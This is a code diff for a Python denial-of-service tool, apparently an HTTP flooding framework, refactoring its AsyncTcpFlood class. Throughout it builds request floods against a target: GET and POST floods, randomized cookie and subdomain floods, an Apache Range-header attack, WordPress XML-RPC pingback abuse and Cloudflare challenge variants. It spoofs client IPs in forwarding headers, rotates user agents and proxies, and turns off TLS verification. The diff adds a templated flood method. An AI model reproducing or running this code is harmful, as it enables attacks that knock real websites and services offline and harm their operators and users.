@@ -1,6 +1,6 @@
 import asyncio
 import errno
-import math
+import json
 import random
 import struct
 import time
@@ -9,26 +9,23 @@ from copy import copy
 from dataclasses import dataclass
 from functools import partial
 from os import urandom as randbytes
-from socket import (inet_ntoa, SO_LINGER, SO_RCVBUF, SOL_SOCKET)
+from socket import (SO_LINGER, SO_RCVBUF, SOL_SOCKET)
 from ssl import CERT_NONE, create_default_context, SSLContext
-from string import ascii_letters
-from typing import Callable, Optional, Set, Tuple
-from urllib import parse
+from typing import Callable, Mapping, Optional, Set, Tuple
 
 import aiohttp
 import async_timeout
 from aiohttp_socks import ProxyConnector
 from OpenSSL import SSL
+from requests.structures import CaseInsensitiveDict
 from yarl import URL
 
 from . import proxy_proto
 from .core import Methods
 from .proto import DatagramFloodIO, FloodIO, FloodOp, FloodSpec, FloodSpecType, TrexIO
-from .proxies import NoProxySet, ProxySet
+from .proxies import ProxySet
 from .targets import Target
-from .utils import GOSSolver
-from .vendor.referers import REFERERS
-from .vendor.rotate import params as rotate_params, suffix as rotate_suffix
+from .utils import GOSSolver, Tools, Templater
 from .vendor.useragents import USERAGENTS
 
 
@@ -62,54 +59,6 @@ trex_ctx = SSL.Context(SSL.TLSv1_2_METHOD)
 # NULL-SHA256             TLSv1.2 Kx=RSA      Au=RSA  Enc=None      Mac=SHA256
 trex_ctx.set_cipher_list(b"RSA")
 trex_ctx.set_verify(SSL.VERIFY_NONE, None)
-
-
-class Tools:
-    @staticmethod
-    def humanbits(i: int) -> str:
-        MULTIPLES = ["Bit", "kBit", "MBit", "GBit"]
-        if i > 0:
-            base = 1024
-            multiple = math.trunc(math.log2(i) / math.log2(base))
-            value = i / pow(base, multiple)
-            return f'{value:.2f} {MULTIPLES[multiple]}'
-        else:
-            return '0 Bit'
-
-    @staticmethod
-    def humanformat(i: int) -> str:
-        MULTIPLES = ['', 'k', 'M', 'G']
-        if i > 0:
-            base = 1000
-            multiple = math.trunc(math.log2(i) / math.log2(base))
-            value = i / pow(base, multiple)
-            return f'{value:.2f}{MULTIPLES[multiple]}'
-        else:
-            return '0'
-
-    @staticmethod
-    def parse_params(target: Target, proxies):
-        url, ip = target.url, target.addr
-        result = url.host.lower().endswith(rotate_suffix)
-        if result:
-            return random.choice(rotate_params), NoProxySet
-        return (url, ip), proxies
-
-    @staticmethod
-    def rand_str(length=16):
-        return ''.join(random.choices(ascii_letters, k=length))
-
-    @staticmethod
-    def rand_ipv4():
-        return inet_ntoa(
-            struct.pack('>I', random.randint(1, 0xffffffff))
-        )
-
-
-def request_info_size(request: aiohttp.RequestInfo) -> int:
-    headers = "\r\n".join(f"{k}: {v}" for k, v in request.headers.items())
-    status_line = f"{request.method} {request.url} HTTP/1.1"
-    return len(f"{status_line}\r\n{headers}\r\n\r\n".encode())
 
 
 @dataclass
@@ -168,73 +117,61 @@ class FloodBase:
 
 class AsyncTcpFlood(FloodBase):
 
-    BASE_HEADERS = (
-        'Accept-Encoding: gzip, deflate, br\r\n'
-        'Accept-Language: en-US,en;q=0.9\r\n'
-        'Cache-Control: max-age=0\r\n'
-        'Connection: Keep-Alive\r\n'
-        'Sec-Fetch-Dest: document\r\n'
-        'Sec-Fetch-Mode: navigate\r\n'
-        'Sec-Fetch-Site: none\r\n'
-        'Sec-Fetch-User: ?1\r\n'
-        'Sec-Gpc: 1\r\n'
-        'Pragma: no-cache\r\n'
-        'Upgrade-Insecure-Requests: 1\r\n'
-    )
+    BASE_HEADERS = {
+        "Accept": "*/*",
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Accept-Language': 'ru-RU,ru;q=0.9,en-US,en;q=0.7',
+        'Cache-Control': 'max-age=0',
+        'Connection': 'Keep-Alive',
+        'Sec-Fetch-Dest': 'document',
+        'Sec-Fetch-Mode': 'navigate',
+        'Sec-Fetch-Site': 'same-origin',
+        'Sec-Fetch-User': '?1',
+        'Pragma': 'no-cache',
+    }
 
     def __init__(self, *args, **kwargs):
         super().__init__(*args, **kwargs)
         self._req_type = (
-            "POST" if self._method in {"POST", "XMLRPC", "STRESS"}
+            "POST" if self._method in {"POST", "STRESS", "XMLRPC"}
             else "HEAD" if self._method in {"HEAD", "RHEAD"}
             else "GET"
         )
 
     @property
     def is_tls(self):
-        return self._url.scheme.lower() == "https" or self._url.port == 443
+        return self._url.port == 443
 
-    def spoof_ip(self) -> str:
-        spoof: str = Tools.rand_ipv4()
-        return (
-            f"X-Forwarded-Host: {self._url.raw_host}\r\n"
-            f"Via: {spoof}\r\n"
-            f"Client-IP: {spoof}\r\n"
-            f'X-Forwarded-Proto: https\r\n'
-            f'X-Forwarded-For: {spoof}\r\n'
-            f'Real-IP: {spoof}\r\n'
-        )
+    def default_headers(self) -> dict:
+        ip: str = Tools.rand_ipv4()
+        origin = str(self._url.origin())
+        headers = {
+            **self.BASE_HEADERS,
+            "Host": self._url.raw_authority,
+            "Origin": origin,
+            "Referer": origin,  # emulate Referrer-Policy: origin
+            "User-Agent": random.choice(USERAGENTS),
+            "X-Forwarded-Host": self._url.raw_authority,
+            "Via": ip,
+            "Client-IP": ip,
+            "X-Forwarded-Proto": "https",
+            "X-Forwarded-For": ip,
+            "Real-IP": ip,
+        }
+        return headers
 
-    def random_headers(self) -> str:
-        return (
-            f"User-Agent: {random.choice(USERAGENTS)}\r\n"
-            f"Referer: {random.choice(REFERERS)}{parse.quote(self._url.human_repr())}\r\n" +
-            self.spoof_ip()
-        )
-
-    def default_headers(self) -> str:
-        return (
-            f"Host: {self._url.authority}\r\n"
-            + self.BASE_HEADERS
-            + self.random_headers()
-        )
-
-    @property
-    def default_path_qs(self):
-        return self._url.raw_path_qs
-
-    def add_rand_query(self, path_qs) -> str:
-        if self._url.raw_query_string:
-            path_qs += '&%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
-        else:
-            path_qs += '?%s=%s' % (Tools.rand_str(6), Tools.rand_str(6))
-        return path_qs
-
-    def build_request(self, path_qs=None, headers=None, body=None) -> bytes:
-        path_qs = path_qs or self.default_path_qs
+    def build_request(self, *, req_type=None, path_qs=None, headers: Optional[Mapping] = None, body=None) -> bytes:
+        req_type = req_type or self._req_type
+        path_qs = path_qs or self._url.raw_path_qs
         headers = headers or self.default_headers()
+
+        headers = '\r\n'.join(
+            f"{key}: {value}"
+            for key, value in headers.items()
+            if value is not None
+        )
         request = (
-            f"{self._req_type} {path_qs} HTTP/1.1\r\n"
+            f"{req_type} {path_qs} HTTP/1.1\r\n"
             + headers
             + '\r\n'
         )
@@ -258,14 +195,19 @@ class AsyncTcpFlood(FloodBase):
         payload_type: FloodSpecType,
         payload,
         on_connect: Optional[asyncio.Future],
+        num_packets: Optional[int] = None,
     ) -> bool:
         on_close = self._loop.create_future()
+        if num_packets is None:
+            num_packets = self._settings.requests_per_connection
         flood_proto = partial(
             FloodIO,
             loop=self._loop,
             on_close=on_close,
             settings=self._settings,
-            flood_spec=FloodSpec.from_any(payload_type, payload, self._settings.requests_per_connection),
+            flood_spec=FloodSpec.from_any(
+                payload_type, payload, num_packets
+            ),
             connections=self._connections,
             on_connect=on_connect,
         )
@@ -298,8 +240,60 @@ class AsyncTcpFlood(FloodBase):
 
         return await self._exec_proto(conn, on_connect, on_close)
 
+    async def HTTP_TEMPLATE(self, on_connect=None) -> bool:
+        def payload_factory():
+            get_opt = self._target.option
+
+            req_type = get_opt('verb')
+            raw_path_qs = get_opt('path_qs')
+            raw_body = get_opt('body')
+            raw_headers = get_opt('headers')
+            include_default_headers = get_opt('include_default_headers', True)
+
+            headers = CaseInsensitiveDict(self.default_headers() if include_default_headers else {})
+            if raw_headers:
+                if isinstance(raw_headers, dict):
+                    render_headers = False
+                    headers.update(raw_headers)
+                else:
+                    render_headers = True
+
+            cache = self._target.cache
+
+            def payload():
+                path_qs = None
+                if raw_path_qs:
+                    path_qs = Templater.render(raw_path_qs, cache)
+
+                if render_headers:
+                    parsed = json.loads(Templater.render(raw_headers, cache))
+                    headers.update(parsed)
+
+                body = None
+                if raw_body:
+                    body = Templater.render(raw_body, cache)
+                    headers['Content-Length'] = str(len(body))
+
+                return self.build_request(
+                    req_type=req_type,
+                    path_qs=path_qs,
+                    headers=headers,
+                    body=body
+                )
+
+            return b''.join(payload() for _ in range(self._settings.requests_per_buffer))
+
+        return await self._generic_flood_proto(
+            FloodSpecType.CALLABLE,
+            payload_factory,
+            on_connect,
+            self._settings.requests_per_connection // self._settings.requests_per_buffer,
+        )
+
     async def GET(self, on_connect=None) -> bool:
-        payload = lambda: self.build_request() * self._settings.requests_per_buffer
+        def payload():
+            return self.build_request() * self._settings.requests_per_buffer
+
         return await self._generic_flood_proto(
             FloodSpecType.BUFFER,
             (payload, self._settings.requests_per_buffer),
@@ -307,8 +301,9 @@ class AsyncTcpFlood(FloodBase):
         )
 
     async def RGET(self, on_connect=None) -> bool:
+        append = {Tools.rand_str(6): Tools.rand_str(6)}
         payload: bytes = self.build_request(
-            path_qs=self.add_rand_query(self.default_path_qs)
+            path_qs=self._url.update_query(**append).raw_path_qs
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
@@ -318,12 +313,12 @@ class AsyncTcpFlood(FloodBase):
     async def POST(self, on_connect=None) -> bool:
         def payload() -> bytes:
             return self.build_request(
-                headers=(
-                    self.default_headers() +
-                    "Content-Length: 44\r\n"
-                    "X-Requested-With: XMLHttpRequest\r\n"
-                    "Content-Type: application/json\r\n"
-                ),
+                headers={
+                    **self.default_headers(),
+                    "Content-Length": "44",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "Content-Type": "application/json",
+                },
                 body='{"data": "%s"}' % Tools.rand_str(32)
             ) * self._settings.requests_per_buffer
 
@@ -336,12 +331,12 @@ class AsyncTcpFlood(FloodBase):
     async def STRESS(self, on_connect=None) -> bool:
         def payload() -> bytes:
             return self.build_request(
-                headers=(
-                    self.default_headers() +
-                    f"Content-Length: 524\r\n"
-                    "X-Requested-With: XMLHttpRequest\r\n"
-                    "Content-Type: application/json\r\n"
-                ),
+                headers={
+                    **self.default_headers(),
+                    "Content-Length": "524",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "Content-Type": "application/json",
+                },
                 body='{"data": "%s"}' % Tools.rand_str(512)
             ) * self._settings.requests_per_buffer
 
@@ -352,34 +347,36 @@ class AsyncTcpFlood(FloodBase):
         )
 
     async def COOKIE(self, on_connect=None) -> bool:
+        cookies = (
+            f"_ga=GA{random.randint(1000, 99999)}; "
+            f"_gat=1; cfduid={Tools.rand_str(39)}; "
+            f"{Tools.rand_str(6)}={Tools.rand_str(32)}"
+        )
         payload: bytes = self.build_request(
-            headers=(
-                self.default_headers() +
-                f"Cookie: _ga=GA{random.randint(1000, 99999)};"
-                " _gat=1;"
-                " __cfduid=dc232334gwdsd23434542342342342475611928;"
-                f" {Tools.rand_str(6)}={Tools.rand_str(32)}\r\n"
-            )
+            headers={
+                **self.default_headers(),
+                "Cookie": cookies
+            }
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def APACHE(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
-            headers=(
-                self.default_headers() +
-                "Range: bytes=0-,%s\r\n" % ",".join("5-%d" % i for i in range(1, 1024))
-            )
+            headers={
+                **self.default_headers(),
+                "Range": "bytes=0-,%s\r\n" % ",".join("5-%d" % i for i in range(1, 1024))
+            }
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def XMLRPC(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
-            headers=(
-                self.default_headers() +
-                "Content-Length: 345\r\n"
-                "X-Requested-With: XMLHttpRequest\r\n"
-                "Content-Type: application/xml\r\n"
-            ),
+            headers={
+                **self.default_headers(),
+                "Content-Length": "345",
+                "X-Requested-With": "XMLHttpRequest",
+                "Content-Type": "application/xml",
+            },
             body=(
                 "<?xml version='1.0' encoding='iso-8859-1'?>"
                 "<methodCall><methodName>pingback.ping</methodName>"
@@ -391,29 +388,25 @@ class AsyncTcpFlood(FloodBase):
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def PPS(self, on_connect=None) -> bool:
-        payload = self.build_request(headers=f"Host: {self._url.authority}\r\n")
+        payload = self.build_request(headers={"Host": self._url.raw_authority})
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def DYN(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
-            headers=(
-                "Host: %s.%s\r\n" % (Tools.rand_str(6), self._url.authority)
-                + self.BASE_HEADERS
-                + self.random_headers()
-            )
+            headers={
+                **self.default_headers(),
+                "Host": "%s.%s" % (Tools.rand_str(6), self._url.raw_authority)
+            }
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
     async def NULL(self, on_connect=None) -> bool:
         payload: bytes = self.build_request(
-            path_qs=self._url.raw_path_qs,
-            headers=(
-                f"Host: {self._url.authority}\r\n"
-                "User-Agent: null\r\n"
-                "Referer: null\r\n"
-                + self.BASE_HEADERS
-                + self.spoof_ip()
-            )
+            headers={
+                **self.default_headers(),
+                "User-Agent": "null",
+                "Referer": "null",
+            }
         )
         return await self._generic_flood_proto(FloodSpecType.BYTES, payload, on_connect)
 
@@ -423,7 +416,7 @@ class AsyncTcpFlood(FloodBase):
         cl_timeout = aiohttp.ClientTimeout(connect=self._settings.connect_timeout_seconds)
         async with aiohttp.ClientSession(connector=connector, timeout=cl_timeout) as s:
             for _ in range(self._settings.requests_per_connection):
-                async with s.get(self._url.human_repr()) as response:
+                async with s.get(str(self._url)) as response:
                     if on_connect and not on_connect.done():
                         on_connect.set_result(True)
                     packets_sent += 1
@@ -448,16 +441,8 @@ class AsyncTcpFlood(FloodBase):
             connect=self._settings.connect_timeout_seconds, total=30)
         conn_id = hash(uuid.uuid4())
         headers = {
+            **self.BASE_HEADERS,
             "User-Agent": user_agent,
-            "Accept-Encoding": "gzip, deflate",
-            'Cache-Control': 'max-age=0',
-            'Connection': 'Keep-Alive',
-            'Sec-Fetch-Dest': 'document',
-            'Sec-Fetch-Mode': 'navigate',
-            'Sec-Fetch-Site': 'none',
-            'Sec-Fetch-User': '?1',
-            'Pragma': 'no-cache',
-            'Accept-Language': 'ru-RU, ru;q=0.9',
         }
         async with aiohttp.ClientSession(
             connector=connector,
@@ -487,7 +472,7 @@ class AsyncTcpFlood(FloodBase):
                     if time.time() > latest_ts:
                         break
                     async with s.get(
-                        self._url.human_repr(),
+                        str(self._url),
                         headers=headers,
                     ) as response:
                         self._connections.add(conn_id)
@@ -582,12 +567,11 @@ class AsyncTcpFlood(FloodBase):
         #      to do a hex here instead of just wrapping into str
         randhex: str = str(randbytes(random.choice([32, 64, 128])))
         packet = self.build_request(
-            path_qs=f'{self._url.authority}/{randhex}',
-            headers=(
-                f"Host: {self._url.authority}/{randhex}\r\n"
-                + self.BASE_HEADERS
-                + self.random_headers()
-            )
+            path_qs=f'{self._url.raw_authority}/{randhex}',
+            headers={
+                **self.default_headers(),
+                "Host": f"{self._url.raw_authority}/{randhex}"
+            }
         )
 
         return await self._generic_flood_proto(FloodSpecType.BYTES, packet, on_connect)
@@ -609,20 +593,18 @@ class AsyncTcpFlood(FloodBase):
         )
 
         p1: bytes = self.build_request(
-            path_qs=f'{self._url.authority}/{hexh}',
-            headers=(
-                f"Host: {self._url.authority}/{hexh}\r\n"
-                + self.BASE_HEADERS
-                + self.random_headers()
-            )
+            path_qs=f'{self._url.raw_authority}/{hexh}',
+            headers={
+                **self.default_headers(),
+                "Host": f"{self._url.raw_authority}/{hexh}"
+            }
         )
         p2: bytes = self.build_request(
-            path_qs=f'{self._url.authority}/cdn-cgi/l/chk_captcha',
-            headers=(
-                f"Host: {hexh}\r\n"
-                + self.BASE_HEADERS
-                + self.random_headers()
-            )
+            path_qs=f'{self._url.raw_authority}/cdn-cgi/l/chk_captcha',
+            headers={
+                **self.default_headers(),
+                "Host": hexh,
+            }
         )
 
         def _gen():
